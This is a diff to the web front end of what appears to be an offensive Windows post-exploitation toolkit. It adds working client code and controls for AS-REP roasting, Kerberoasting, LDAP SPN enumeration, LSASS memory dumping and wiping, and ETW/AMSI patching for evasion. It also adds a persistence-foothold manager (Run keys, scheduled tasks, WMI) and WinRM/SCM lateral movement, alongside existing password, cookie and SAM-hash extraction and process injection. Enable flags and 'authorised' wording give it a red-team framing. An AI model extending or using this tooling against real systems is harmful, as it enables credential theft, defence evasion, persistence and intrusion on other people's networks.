@@ -296,6 +296,24 @@
         .toast .t-time { font-family: var(--mono); font-size: 10.5px; color: var(--dim); margin-right: 8px; }
         @keyframes toastin { from { opacity: 0; transform: translateX(12px); } to { opacity: 1; transform: none; } }
 
+        /* Inline button icons: feather-style stroke SVGs. .btn svg picks up
+           the icon automatically; status marks and audit rows use window.ICO. */
+        .btn { display: inline-flex; align-items: center; gap: 6px; }
+        .btn svg { width: 13px; height: 13px; flex-shrink: 0; }
+        .modal-x svg { width: 14px; height: 14px; }
+        .tbl-ico { width: 13px; height: 13px; vertical-align: -2px; }
+        .opt-log-ico { width: 11px; height: 11px; vertical-align: -1px; margin-right: 4px; }
+
+        /* Form rows for the prompt modal (extract input fields). */
+        .form-grid { display: flex; flex-direction: column; gap: 10px; }
+        .form-grid label { font-size: 11px; color: var(--text-2); font-weight: 600; text-transform: uppercase; letter-spacing: .6px; }
+        .form-grid input, .form-grid select {
+            width: 100%; background: var(--bg-2); border: 1px solid var(--border-2);
+            border-radius: 6px; color: var(--text); padding: 8px 10px;
+            font-family: var(--mono); font-size: 12px;
+        }
+        .form-grid input:focus, .form-grid select:focus { outline: none; border-color: var(--accent); }
+
         .hint { font-size: 12px; color: var(--dim); line-height: 1.5; }
         .split { display: grid; grid-template-columns: 1fr; gap: 14px; }
         @media (min-width: 1100px) { .split.two { grid-template-columns: 340px 1fr; } }
@@ -357,6 +375,14 @@
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>
                     Architect
                 </button>
+                <button class="nav-item" data-view="pulse" onclick="window.showView('pulse'); window.loadPersist()">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
+                    Pulse
+                </button>
+                <button class="nav-item" data-view="relay" onclick="window.showView('relay')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"/><path d="M12 5l7 7-7 7"/><circle cx="4" cy="12" r="2"/></svg>
+                    Relay
+                </button>
                 <button class="nav-item" data-view="audit" onclick="window.showView('audit')">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="9" y1="13" x2="15" y2="13"/><line x1="9" y1="17" x2="13" y2="17"/></svg>
                     Audit
@@ -409,10 +435,10 @@
                         <div class="card">
                             <h3>Quick actions</h3>
                             <div style="display:flex; flex-direction:column; gap:8px;">
-                                <button class="btn btn-primary" onclick="window.showView('audit'); window.runAudit()">▶ Run attack-surface audit</button>
-                                <button class="btn btn-ghost" onclick="window.showView('intel'); window.extractIntel()">🔑 Extract passwords</button>
-                                <button class="btn btn-ghost" onclick="window.showView('intel'); window.extractCookies()">🍪 Harvest cookies</button>
-                                <button class="btn btn-ghost" onclick="window.showView('cons')">⌘ Open terminal</button>
+                                <button class="btn btn-primary" onclick="window.showView('audit'); window.runAudit()"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="6 3 20 12 6 21"/></svg>Run attack-surface audit</button>
+                                <button class="btn btn-ghost" onclick="window.showView('intel'); window.extractIntel()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>Extract passwords</button>
+                                <button class="btn btn-ghost" onclick="window.showView('intel'); window.extractCookies()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><circle cx="9" cy="10" r="0.8" fill="currentColor"/><circle cx="15" cy="9" r="0.8" fill="currentColor"/><circle cx="9" cy="15" r="0.8" fill="currentColor"/><circle cx="15" cy="15" r="0.8" fill="currentColor"/><circle cx="12" cy="12" r="0.8" fill="currentColor"/></svg>Harvest cookies</button>
+                                <button class="btn btn-ghost" onclick="window.showView('cons')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 3a3 3 0 0 0-3 3v12a3 3 0 1 0 3-3H6a3 3 0 1 0 3 3V6a3 3 0 1 0-3 3h12a3 3 0 0 0 0-6z"/></svg>Open terminal</button>
                             </div>
                         </div>
                         <div class="card">
@@ -433,7 +459,7 @@
                 <div class="view" id="view-proc">
                     <div class="btn-row">
                         <input type="text" id="p-search" placeholder="Filter processes…" oninput="window.filterProcs()" style="max-width:320px;">
-                        <button class="btn btn-ghost btn-sm" onclick="window.fetchProcs()">↻ Refresh</button>
+                        <button class="btn btn-ghost btn-sm" onclick="window.fetchProcs()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>Refresh</button>
                         <span class="hint" id="proc-count"></span>
                     </div>
                     <div class="table-wrap proc">
@@ -452,7 +478,7 @@
                     <div class="card">
                         <h3>Stealth tweaks</h3>
                         <p class="hint" style="margin-bottom:14px;">One-click telemetry &amp; privacy hardening: disables diagnostic tracking services and related registry policies.</p>
-                        <button class="btn btn-primary" onclick="window.applyTweaks()">⚡ Apply stealth tweaks</button>
+                        <button class="btn btn-primary" onclick="window.applyTweaks()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>Apply stealth tweaks</button>
                         <div id="opt-log" class="terminal" style="height:260px; margin-top:14px;"></div>
                     </div>
                 </div>
@@ -474,7 +500,7 @@
                     <div class="card">
                         <h3>Payload integrity</h3>
                         <div class="btn-row">
-                            <button class="btn btn-ghost btn-sm" onclick="window.loadHex()">↻ Reload payload</button>
+                            <button class="btn btn-ghost btn-sm" onclick="window.loadHex()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>Reload payload</button>
                         </div>
                         <div class="terminal" id="hex-body" style="font-size:11px; min-height:280px; color:var(--accent);">[LOADING_PAYLOAD…]</div>
                     </div>
@@ -483,10 +509,12 @@
                 <!-- DECRYPTER -->
                 <div class="view" id="view-intel">
                     <div class="btn-row">
-                        <button class="btn btn-primary btn-sm intel-tab" data-mode="creds" onclick="window.extractIntel()">🔑 Passwords</button>
-                        <button class="btn btn-ghost btn-sm intel-tab" data-mode="cookies" onclick="window.extractCookies()">🍪 Cookies</button>
-                        <button class="btn btn-ghost btn-sm intel-tab" data-mode="nexus" onclick="window.extractNexus()">🔗 Nexus correlation</button>
-                        <button class="btn btn-ghost btn-sm intel-tab" data-mode="sam" onclick="window.extractSAM()">🗝 SAM hashes</button>
+                        <button class="btn btn-primary btn-sm intel-tab" data-mode="creds" onclick="window.extractIntel()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>Passwords</button>
+                        <button class="btn btn-ghost btn-sm intel-tab" data-mode="cookies" onclick="window.extractCookies()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><circle cx="9" cy="10" r="0.8" fill="currentColor"/><circle cx="15" cy="9" r="0.8" fill="currentColor"/><circle cx="9" cy="15" r="0.8" fill="currentColor"/><circle cx="15" cy="15" r="0.8" fill="currentColor"/><circle cx="12" cy="12" r="0.8" fill="currentColor"/></svg>Cookies</button>
+                        <button class="btn btn-ghost btn-sm intel-tab" data-mode="nexus" onclick="window.extractNexus()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>Nexus correlation</button>
+                        <button class="btn btn-ghost btn-sm intel-tab" data-mode="sam" onclick="window.extractSAM()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="4.5"/><path d="M10.8 12.2L21 2m-4 4l-1.5 1.5M17.5 7.5l3 3"/></svg>SAM hashes</button>
+                        <button class="btn btn-ghost btn-sm intel-tab" data-mode="asrep" onclick="window.roastASREP()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg>AS-REP roast</button>
+                        <button class="btn btn-ghost btn-sm intel-tab" data-mode="tgs" onclick="window.roastTGS()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>Kerberoast</button>
                         <span style="flex:1"></span>
                         <button class="btn btn-ghost btn-sm" onclick="window.exportIntelCSV()">[Export CSV]</button>
                     </div>
@@ -507,12 +535,65 @@
                         <div class="card">
                             <h3>Injection target</h3>
                             <input type="text" id="target-pid" readonly placeholder="no PID selected" style="text-align:center; color:var(--accent); font-size:20px; letter-spacing:2px; margin-bottom:14px;">
-                            <p class="hint" style="margin-bottom:14px;">Select a process in the Processes view, then dispatch the payload. Requires <span class="mono" style="color:var(--text)">--enable-inject</span>; W^X transitions only (RW → RX, never RWX).</p>
-                            <button class="btn btn-danger" style="width:100%;" onclick="window.injectSignal()">⚡ Quantum Sync</button>
+                            <p class="hint" style="margin-bottom:14px;">Select a process in the Processes view, then dispatch the payload. Requires <span class="mono" style="color:var(--text)">--enable-inject</span>; W^X transitions only (RW > RX, never RWX).</p>
+                            <button class="btn btn-danger" style="width:100%;" onclick="window.injectSignal()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>Quantum Sync</button>
                         </div>
                         <div class="card">
                             <h3>Status</h3>
                             <div id="sig-status" class="terminal" style="min-height:180px;">[IDLE]</div>
+                        </div>
+                    </div>
+                    <div class="split two" style="margin-top:14px;">
+                        <div class="card">
+                            <h3>LSASS memory acquisition</h3>
+                            <p class="hint" style="margin-bottom:14px;">Full-memory minidump via the system dump API (full-memory flavour). Requires <span class="mono" style="color:var(--text)">--enable-collect</span> + an elevated token; PPL-protected LSASS refuses. Parse the dump offline (e.g. pypykatz), then wipe it.</p>
+                            <div style="display:flex; gap:8px; flex-wrap:wrap;">
+                                <button class="btn btn-danger btn-sm" onclick="window.dumpLSASS()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Dump current process LSASS</button>
+                                <button class="btn btn-ghost btn-sm" onclick="window.dumpLSASSByPid()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>Dump other PID</button>
+                            </div>
+                        </div>
+                        <div class="card">
+                            <h3>Self-telemetry evasion</h3>
+                            <p class="hint" style="margin-bottom:14px;">Neuter the ntdll ETW write export and the AMSI scan entry point in the tool's own process (W^X-safe transition, logged — never silent). Requires <span class="mono" style="color:var(--text)">--enable-evasion</span>.</p>
+                            <div style="display:flex; gap:8px; flex-wrap:wrap;">
+                                <button class="btn btn-ghost btn-sm" onclick="window.patchETW()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><line x1="4" y1="4" x2="20" y2="20"/></svg>Neuter ETW (self)</button>
+                                <button class="btn btn-ghost btn-sm" onclick="window.patchAMSI()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><line x1="9" y1="9" x2="15" y2="15"/><line x1="15" y1="9" x2="9" y2="15"/></svg>Neuter AMSI (self)</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- PULSE: persistence manager -->
+                <div class="view" id="view-pulse">
+                    <div class="btn-row">
+                        <button class="btn btn-primary btn-sm" onclick="window.loadPersist()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>Scan footholds</button>
+                        <button class="btn btn-ghost btn-sm" onclick="window.addPersist()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>Add foothold</button>
+                        <span class="hint" style="margin-left:auto;">Requires <span class="mono" style="color:var(--text)">--enable-persist</span>. Run keys + Startup + scheduled tasks + WMI subscriptions.</span>
+                    </div>
+                    <div class="table-wrap audit">
+                        <table>
+                            <thead><tr><th>TYPE</th><th>SURFACE</th><th>NAME</th><th>COMMAND</th><th></th></tr></thead>
+                            <tbody id="persist-body">
+                                <tr class="empty-row"><td colspan="5">Press Scan footholds to list persistence footholds on this host.</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- RELAY: lateral movement -->
+                <div class="view" id="view-relay">
+                    <div class="split two">
+                        <div class="card">
+                            <h3>Remote execution</h3>
+                            <p class="hint" style="margin-bottom:14px;">Run a command on a remote host. <span class="mono" style="color:var(--text)">WinRM</span> (T1021.006) speaks WS-Management over 5985/5986 with Basic auth; <span class="mono" style="color:var(--text)">SCM</span> (T1021.002) creates, starts and removes a service on the target's Service Control Manager. Requires <span class="mono" style="color:var(--text)">--enable-lateral</span> and explicit operator credentials.</p>
+                            <div style="display:flex; gap:8px; flex-wrap:wrap;">
+                                <button class="btn btn-danger btn-sm" onclick="window.lateralWinRM()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>WinRM exec</button>
+                                <button class="btn btn-danger btn-sm" onclick="window.lateralSCM()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>SCM exec</button>
+                            </div>
+                        </div>
+                        <div class="card">
+                            <h3>Relay output</h3>
+                            <div id="relay-status" class="terminal" style="min-height:180px;">[IDLE]</div>
                         </div>
                     </div>
                 </div>
@@ -520,7 +601,7 @@
                 <!-- AUDIT -->
                 <div class="view" id="view-audit">
                     <div class="btn-row">
-                        <button class="btn btn-primary btn-sm" onclick="window.runAudit()">▶ Run audit</button>
+                        <button class="btn btn-primary btn-sm" onclick="window.runAudit()"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="6 3 20 12 6 21"/></svg>Run audit</button>
                         <button class="btn btn-ghost btn-sm" onclick="window.exportAuditCSV()">[Export CSV]</button>
                         <span id="audit-summary" style="font-family:var(--mono); font-size:11.5px; color:var(--text-2); margin-left:auto;"></span>
                     </div>
@@ -543,7 +624,7 @@
         <div class="modal">
             <div class="modal-head">
                 <span class="modal-title" id="modal-title">Confirm</span>
-                <button class="modal-x" onclick="window.hideModal()">✕</button>
+                <button class="modal-x" onclick="window.hideModal()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
             </div>
             <div class="modal-body" id="modal-body"></div>
             <div class="modal-foot" id="modal-foot"></div>
@@ -562,6 +643,16 @@
         window._samData = [];
         window._hexLoaded = false;
         window._intelMode = '';
+        window._roastData = [];
+        window._lsassPath = '';
+
+        /* Status icons: inline SVGs (no emoji). Classes match the table CSS. */
+        window.ICO = {
+            check: '<svg class="tbl-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>',
+            cross: '<svg class="tbl-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
+            chev:  '<svg class="opt-log-ico" viewBox="0 0 24 24" fill="currentColor"><polygon points="6 3 20 12 6 21"/></svg>',
+            trash: '<svg class="tbl-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>'
+        };
 
         const VIEW_META = {
             dash:  ['Overview', 'host snapshot & quick actions'],
@@ -571,6 +662,7 @@
             hex:   ['Hex Viewer', 'payload integrity inspection'],
             intel: ['Decrypter', 'authorised collection modules'],
             sig:   ['Architect', 'injection research module'],
+            pulse: ['Pulse', 'persistence foothold manager'],
             audit: ['Attack-Surface Audit', 'Mimikatz checklist'],
         };
 
@@ -658,6 +750,62 @@
             });
         };
 
+        /* Input modal: fields is [{id, label, value, type, options}] — returns
+           an object of values or null when the user cancels. */
+        window.promptModal = function(title, fields) {
+            return new Promise(function(resolve) {
+                document.getElementById('modal-title').innerText = title;
+                const body = document.getElementById('modal-body');
+                body.innerHTML = '';
+                const grid = document.createElement('div');
+                grid.className = 'form-grid';
+                fields.forEach(function(f) {
+                    const wrap = document.createElement('div');
+                    const lab = document.createElement('label');
+                    lab.innerText = f.label;
+                    lab.setAttribute('for', 'pm-' + f.id);
+                    wrap.appendChild(lab);
+                    let input;
+                    if (f.options) {
+                        input = document.createElement('select');
+                        f.options.forEach(function(o) {
+                            const opt = document.createElement('option');
+                            opt.value = o; opt.innerText = o;
+                            input.appendChild(opt);
+                        });
+                    } else {
+                        input = document.createElement('input');
+                        input.type = f.type || 'text';
+                        input.placeholder = f.placeholder || '';
+                    }
+                    input.id = 'pm-' + f.id;
+                    if (f.value) input.value = f.value;
+                    wrap.appendChild(input);
+                    grid.appendChild(wrap);
+                });
+                body.appendChild(grid);
+                const foot = document.getElementById('modal-foot');
+                foot.innerHTML = '';
+                const cancel = document.createElement('button');
+                cancel.className = 'btn btn-ghost';
+                cancel.innerText = 'Cancel';
+                cancel.onclick = function() { window.hideModal(); resolve(null); };
+                const ok = document.createElement('button');
+                ok.className = 'btn btn-primary';
+                ok.innerText = 'Run';
+                ok.onclick = function() {
+                    const out = {};
+                    fields.forEach(function(f) { out[f.id] = document.getElementById('pm-' + f.id).value; });
+                    window.hideModal(); resolve(out);
+                };
+                foot.appendChild(cancel);
+                foot.appendChild(ok);
+                window.showModal();
+                const first = document.getElementById('pm-' + fields[0].id);
+                if (first) first.focus();
+            });
+        };
+
         /* ---------- toasts + log ---------- */
         window.toast = function(m, l) {
             const wrap = document.getElementById('toasts');
@@ -714,6 +862,11 @@
                     if (d.type === 'cookies_done') { window._renderCookies(window._cookiesData); window._cookiesData = []; }
                     if (d.type === 'sam_chunk') { window._samData = window._samData.concat(d.entries); window.log('SAM chunk: ' + d.entries.length + ' entries', 'INFO'); }
                     if (d.type === 'sam_done') { window._renderSAM(window._samData); window._samData = []; }
+                    if (d.type === 'roast_hash') { window._roastData.push(d); window.log('Roast hash: ' + (d.spn || d.user) + ' [' + d.kind + ']', 'INFO'); }
+                    if (d.type === 'roast_done') { window._renderRoast(window._roastData); window._roastData = []; }
+                    if (d.type === 'spn_list') { window._renderSPN(d.entries || []); }
+                    if (d.type === 'lsass_done') { window._renderLSASS(d); }
+                    if (d.type === 'lateral_done') { window._renderLateral(d); }
                 };
             } catch(e) {
                 window.log('WebSocket init failed', 'ERROR');
@@ -925,6 +1078,102 @@
             }
         };
 
+        /* ---------- kerberoast (T1558) ---------- */
+        window._renderRoast = function(d) {
+            const body = document.getElementById('intel-body');
+            if (!body) return;
+            body.innerHTML = '';
+            if (d.length === 0) body.innerHTML = '<tr class="empty-row"><td colspan="3" style="color:var(--red);">No roastable material (pre-auth required, RC4 disabled, or unreachable KDC).</td></tr>';
+            const rows = [];
+            for (const e of d) {
+                rows.push(`<tr><td style="font-family:var(--mono); color:var(--accent);">${window.esc(e.kind === 'tgs' ? 'TGS' : 'AS-REP')}</td><td style="font-weight:600;">${window.esc(e.user)}${e.spn ? ' <span style="color:var(--dim); font-size:11px;">' + window.esc(e.spn) + '</span>' : ''}</td><td style="font-family:var(--mono); font-size:11px; color:var(--amber); word-break:break-all;">${window.esc(e.hash)}</td></tr>`);
+            }
+            body.innerHTML = rows.join('');
+            window.log('Roast done: ' + d.length + ' hash(es)', 'SUCCESS');
+        };
+
+        window.roastASREP = async function() {
+            const v = await window.promptModal('AS-REP roast — no pre-auth probe', [
+                {id:'user', label:'Username (pre-auth disabled account)', placeholder:'svc-nightly'},
+                {id:'domain', label:'Domain', placeholder:'corp.local'},
+                {id:'kdc', label:'KDC host (blank = DNS SRV discovery)', placeholder:''},
+            ]);
+            if (!v) return;
+            window.showView('intel');
+            window._intelMode = 'asrep';
+            window.log('AS-REP roasting ' + v.user + '@' + v.domain, 'INFO');
+            window._intelHead(['MODE', 'USER / SERVICE', 'HASH (hashcat)']);
+            window._intelWait('Waiting on the KDC…');
+            window._roastData = [];
+            try {
+                await window.req('/v1/op/roast-asrep', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({user:v.user, domain:v.domain, kdc:v.kdc}),
+                });
+            } catch(e) {
+                window.log('Roast blocked: ' + (e.message || e), 'ERROR');
+                document.getElementById('intel-body').innerHTML = `<tr class="empty-row"><td colspan="3" style="color:var(--red);">${window.esc(e.message)}</td></tr>`;
+            }
+        };
+
+        window.roastTGS = async function() {
+            const v = await window.promptModal('Kerberoast — TGS roast under a service key', [
+                {id:'user', label:'Username (TGT holder)', placeholder:'svc-roast'},
+                {id:'nthash', label:'NT hash (32 hex, password never accepted)', placeholder:'31d6cfe0d16ae931b73c59d7e0c089c0'},
+                {id:'domain', label:'Domain', placeholder:'corp.local'},
+                {id:'spns', label:'SPNs (comma separated)', placeholder:'MSSQLSvc/dc.corp.local:1433,HTTP/web.corp.local'},
+                {id:'kdc', label:'KDC host (blank = DNS SRV discovery)', placeholder:''},
+            ]);
+            if (!v) return;
+            window.showView('intel');
+            window._intelMode = 'tgs';
+            const spns = v.spns.split(',').map(s => s.trim()).filter(s => s);
+            window.log('Kerberoasting ' + spns.length + ' SPN(s)', 'INFO');
+            window._intelHead(['MODE', 'USER / SERVICE', 'HASH (hashcat)']);
+            window._intelWait('Waiting on the KDC…');
+            window._roastData = [];
+            try {
+                await window.req('/v1/op/roast-tgs', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({user:v.user, domain:v.domain, hash:v.nthash, spns:spns, kdc:v.kdc}),
+                });
+            } catch(e) {
+                window.log('Roast blocked: ' + (e.message || e), 'ERROR');
+                document.getElementById('intel-body').innerHTML = `<tr class="empty-row"><td colspan="3" style="color:var(--red);">${window.esc(e.message)}</td></tr>`;
+            }
+        };
+
+        window.enumSPN = async function() {
+            const v = await window.promptModal('SPN enumeration (LDAP simple bind — lab only)', [
+                {id:'host', label:'DC host (blank = KDC discovery)', placeholder:''},
+                {id:'domain', label:'Domain', placeholder:'corp.local'},
+                {id:'user', label:'Bind user', placeholder:'svc-roast'},
+                {id:'password', label:'Bind password (clear text on the wire)', type:'password', placeholder:''},
+            ]);
+            if (!v) return;
+            window.showView('intel');
+            window._intelMode = 'spn';
+            window.log('Enumerating SPNs via LDAP on ' + (v.host || 'auto'), 'INFO');
+            window._renderSPN = function(rows) {
+                window._intelHead(['ACCOUNT', 'SPN', 'RC4']);
+                const body = document.getElementById('intel-body');
+                body.innerHTML = '';
+                if (rows.length === 0) body.innerHTML = '<tr class="empty-row"><td colspan="3" style="color:var(--red);">No SPNs found.</td></tr>';
+                for (const e of rows) {
+                    body.innerHTML += `<tr><td style="font-weight:600;">${window.esc(e.Account)}</td><td style="font-family:var(--mono); font-size:11px;">${window.esc(e.SPN)}</td><td style="color:${e.RC4?'var(--green)':'var(--red)'}; font-weight:700;">${e.RC4?'YES':'NO'}</td></tr>`;
+                }
+                window.log('SPN enumeration done: ' + rows.length + ' entries', 'SUCCESS');
+            };
+            try {
+                await window.req('/v1/op/spn-enum', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({host:v.host, domain:v.domain, user:v.user, password:v.password}),
+                });
+            } catch(e) {
+                window.log('Enumeration blocked: ' + (e.message || e), 'ERROR');
+            }
+        };
+
         window.extractNexus = async function() {
             window.showView('intel');
             window._intelMode = 'nexus';
@@ -955,6 +1204,95 @@
             }
         };
 
+        /* ---------- LSASS acquisition (T1003.001) ---------- */
+        window.dumpLSASS = function() {
+            const rows = document.querySelectorAll('#view-proc tr');
+            let pid = null;
+            rows.forEach(function(r) {
+                const c = r.cells;
+                if (c && c[1] && /lsass/i.test(c[1].innerText)) pid = parseInt(c[0].innerText, 10);
+            });
+            if (!pid) {
+                window.toast('LSASS not found in the process table — pick a PID instead', 'ERROR');
+                return window.dumpLSASSByPid();
+            }
+            window.showView('sig');
+            window.log('Dumping LSASS PID ' + pid, 'INFO');
+            window._renderLSASS = function(d) {
+                window._lsassPath = d.path || '';
+                document.getElementById('sig-status').innerText = '[LSASS_DUMPED > ' + d.path + ' (' + d.size + ' bytes)]';
+                window.toast('LSASS minidump ready — parse offline, then wipe', 'SUCCESS');
+                window.log('LSASS dump: ' + d.path + ' (' + d.size + ' bytes)', 'SUCCESS');
+            };
+            window.req('/v1/op/lsass', {
+                method:'POST', headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({pid: pid}),
+            }).catch(e => window.log('LSASS dump blocked: ' + (e.message || e), 'ERROR'));
+        };
+
+        window.dumpLSASSByPid = async function() {
+            const v = await window.promptModal('LSASS acquisition — memory dump', [
+                {id:'pid', label:'Target PID', placeholder:'660'},
+            ]);
+            if (!v || !parseInt(v.pid, 10)) return;
+            window.showView('sig');
+            window.log('Dumping PID ' + v.pid, 'INFO');
+            window._renderLSASS = function(d) {
+                window._lsassPath = d.path || '';
+                document.getElementById('sig-status').innerText = '[LSASS_DUMPED > ' + d.path + ' (' + d.size + ' bytes)]';
+                window.log('LSASS dump: ' + d.path + ' (' + d.size + ' bytes)', 'SUCCESS');
+            };
+            try {
+                await window.req('/v1/op/lsass', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({pid: parseInt(v.pid, 10)}),
+                });
+            } catch(e) {
+                window.log('LSASS dump blocked: ' + (e.message || e), 'ERROR');
+            }
+        };
+
+        window.wipeLSASS = async function() {
+            if (!window._lsassPath) { window.toast('No dump path recorded', 'ERROR'); return; }
+            const ok = await window.confirmModal('Wipe dump', 'Zero and delete <span class="mono">' + window.esc(window._lsassPath) + '</span>?', 'Wipe', true);
+            if (!ok) return;
+            try {
+                await window.req('/v1/op/lsass-wipe', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({path: window._lsassPath}),
+                });
+                window._lsassPath = '';
+                document.getElementById('sig-status').innerText = '[WIPED]';
+            } catch(e) {
+                window.log('Wipe failed: ' + (e.message || e), 'ERROR');
+            }
+        };
+
+        /* ---------- self-evasion ---------- */
+        window.patchETW = async function() {
+            const ok = await window.confirmModal('Neuter ETW (self)',
+                'Patch the ntdll ETW write export in the tool process (W^X-safe transition, logged). Continue?', 'Patch', true);
+            if (!ok) return;
+            try {
